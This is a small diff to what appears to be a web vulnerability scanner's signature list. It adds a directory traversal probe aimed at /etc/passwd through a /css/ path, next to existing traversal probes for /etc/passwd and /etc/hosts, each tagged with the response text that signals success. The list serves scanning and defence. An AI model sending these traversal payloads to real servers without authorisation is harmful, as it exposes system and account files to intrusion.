@@ -147,6 +147,7 @@ _ {status=200}
 /%20../web-inf/  {severity=2}
 
 # Directory traversal
+/css/../../../../../../../../etc/passwd {tag="root:x:"}
 /../../../../../../../../../../../../../etc/passwd  {tag="root:x:"}
 //../../../../../../../../../../../../../etc/passwd {tag="root:x:"}
 /../../../../../../../../../../../../../etc/hosts   {tag="localhost"}
